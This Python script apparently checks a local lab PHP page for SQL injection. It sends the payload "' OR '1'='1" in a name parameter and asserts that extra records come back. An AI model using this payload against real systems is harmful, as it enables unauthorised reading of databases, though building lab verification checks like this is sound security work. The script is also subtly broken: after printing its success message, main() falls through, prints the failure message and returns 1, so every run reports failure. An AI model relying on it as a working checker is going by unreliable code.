#!/usr/bin/env python3
import http.client
import urllib.parse
import re
import html
import sys

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"

def fetch_body(name):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    query = urllib.parse.urlencode({"name": name})
    conn.request("GET", f"{PATH}?{query}", headers={"Host": f"{HOST}:{PORT}"})
    resp = conn.getresponse()
    status = resp.status
    body = resp.read().decode("utf-8", "replace")
    conn.close()

    # http.client 不自动跟随重定向；这里显式拒绝 3xx。
    if 300 <= status < 400:
        raise RuntimeError(f"拒绝重定向: HTTP {status}")
    if status != 200:
        raise RuntimeError(f"请求失败: HTTP {status}")
    return body

def parse_records(body):
    records = set()
    # 对应 F01:0022-F01:0023 的输出：<p>ID 1：Alice</p>
    for m in re.finditer(r"<p>ID\s*(\d+)：([^<]*)</p>", body):
        records.add((int(m.group(1)), html.unescape(m.group(2))))
    return records

def main():
    normal_input = "Alice"
    test_input = "' OR '1'='1"

    expected_normal = {(1, "Alice")}
    expected_test_min = {(1, "Alice"), (2, "Bob"), (3, "Carol")}

    try:
        normal_body = fetch_body(normal_input)
        test_body = fetch_body(test_input)
    except Exception as e:
        print(f"请求阶段失败：{e}")
        print("请检查：127.0.0.1:4280 是否监听、入口路径是否存在、PHP 报错日志、common/db_connect.php 的 $db 连接。")
        return 2

    normal_records = parse_records(normal_body)
    test_records = parse_records(test_body)

    print(f"普通请求 name={normal_input!r} 解析记录: {sorted(normal_records)}")
    print(f"测试请求 name={test_input!r} 解析记录: {sorted(test_records)}")
    print(f"预期普通记录: {sorted(expected_normal)}")
    print(f"预期测试至少包含: {sorted(expected_test_min)}")

    ok = (
        normal_records == expected_normal
        and expected_test_min.issubset(test_records)
    )

    if ok:
        print("成功断言：普通请求仅返回 Alice；测试请求返回了 Alice/Bob/Carol 的实际业务记录，记录集合发生受控差异。")

    print("未能完成判断：未满足记录集合断言。")
    print("若普通请求不符，检查端口、路径、lab_people 预置数据和数据库连接；")
    print("若测试请求仍只返回 Alice 或查询失败，检查输入是否被转义/预处理、测试载荷是否被改写、表数据与权限/错误配置。")
    return 1

if __name__ == "__main__":
    sys.exit(main())
